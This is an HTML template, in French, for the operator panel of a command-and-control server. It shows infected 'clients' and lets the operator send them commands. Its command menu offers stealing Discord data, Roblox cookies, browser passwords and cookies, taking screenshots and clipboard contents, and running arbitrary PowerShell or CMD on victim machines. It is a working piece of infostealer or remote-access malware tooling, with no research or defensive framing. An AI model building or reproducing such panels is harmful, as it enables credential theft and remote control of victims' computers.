<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Panel</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div class="app-container">
        <aside class="sidebar">
            <div class="logo">
                <span class="logo-icon"><i class="fas fa-bullseye"></i></span>
                <span class="logo-text">C2 Panel</span>
            </div>
            <nav class="nav-menu">
                <a href="#" class="nav-item active" data-page="dashboard">
                    <i class="fas fa-chart-pie nav-icon"></i> Dashboard
                </a>
                <a href="#" class="nav-item" data-page="clients">
                    <i class="fas fa-desktop nav-icon"></i> Clients
                </a>
                <a href="#" class="nav-item" data-page="activities">
                    <i class="fas fa-history nav-icon"></i> Activités
                </a>
            </nav>
            <div class="sidebar-footer">
                <div class="user-info">
                    <i class="fas fa-user-circle"></i> {{ username }}
                </div>
                <a href="/logout" class="logout-btn"><i class="fas fa-sign-out-alt"></i> Déconnexion</a>
            </div>
        </aside>

        <main class="main-content">
            <header class="header">
                <h1 id="page-title">Dashboard</h1>
                <button class="refresh-btn" onclick="refreshAll()"><i class="fas fa-sync-alt"></i> Actualiser</button>
            </header>

            <div id="dashboard-page" class="page active">
                <div class="stats-grid">
                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-hdd"></i></div><div class="stat-info"><h3 id="total-clients">0</h3><p>Clients</p></div></div>
                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-circle" style="color:#22c55e;"></i></div><div class="stat-info"><h3 id="online-clients">0</h3><p>En ligne</p></div></div>
                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-clock"></i></div><div class="stat-info"><h3 id="pending-commands">0</h3><p>En attente</p></div></div>
                    <div class="stat-card"><div class="stat-icon"><i class="fas fa-check"></i></div><div class="stat-info"><h3 id="executed-commands">0</h3><p>Exécutées</p></div></div>
                </div>
                <div class="recent-activities">
                    <h2>Activités récentes</h2>
                    <div id="recent-activities" class="activities-list"></div>
                </div>
            </div>

            <div id="clients-page" class="page">
                <div class="clients-header">
                    <input type="text" id="client-search" placeholder="Rechercher..." onkeyup="filterClients()">
                </div>
                <div id="clients-grid" class="clients-grid"></div>
            </div>

            <div id="activities-page" class="page">
                <div id="activities-full" class="activities-full"></div>
            </div>
        </main>
    </div>

    <!-- MODAL COMMANDE -->
    <div id="command-modal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2><i class="fas fa-terminal"></i> Commande</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body">
                <p>Client : <strong id="modal-client-name"></strong></p>
                <div class="form-group">
                    <label>Type</label>
                    <select id="command-type">
                        <option value="ping">🏓 Ping</option>
                        <option value="system_info">💻 Système</option>
                        <option value="discord_data">🎮 Discord</option>
                        <option value="roblox_cookie">🎲 Roblox</option>
                        <option value="browser_passwords">🔑 Mots de passe</option>
                        <option value="browser_cookies">🍪 Cookies</option>
                        <option value="screenshot">📸 Capture</option>
                        <option value="clipboard">📋 Presse-papier</option>
                        <option value="list_processes">📊 Processus</option>
                        <option value="execute_ps">⚡ PowerShell</option>
                        <option value="execute_cmd">💻 CMD</option>
                    </select>
                </div>
                <div class="form-group" id="command-params-group" style="display:none;">
                    <label>Paramètres</label>
                    <textarea id="command-params" rows="3"></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn-secondary" onclick="closeModal()">Annuler</button>
                <button class="btn-primary" onclick="executeCommand()"><i class="fas fa-paper-plane"></i> Exécuter</button>
            </div>
        </div>
    </div>

    <!-- MODAL TRAITEMENT -->
    <div id="processing-modal" class="modal">
        <div class="modal-content modal-processing">
            <div class="spinner-box">
                <div class="spinner"></div>
            </div>
            <h3>Traitement en cours...</h3>
            <p id="processing-timer">0s</p>
        </div>
    </div>

    <!-- MODAL RÉSULTAT -->
    <div id="result-modal" class="modal">
        <div class="modal-content modal-large">
            <div class="modal-header">
                <h2 id="result-title"><i class="fas fa-check-circle"></i> Résultat</h2>
                <span class="close" onclick="closeResultModal()">&times;</span>
            </div>
            <div class="modal-body" id="result-content"></div>
        </div>
    </div>

    <!-- LIGHTBOX PLEIN ÉCRAN -->
    <div id="lightbox-modal" class="modal lightbox-modal" onclick="closeLightbox()">
        <span class="close-lightbox" onclick="closeLightbox()">&times;</span>
        <img id="lightbox-img" src="" onclick="event.stopPropagation()">
    </div>

    <script src="{{ url_for('static', filename='script.js') }}"></script>
</body>
</html>
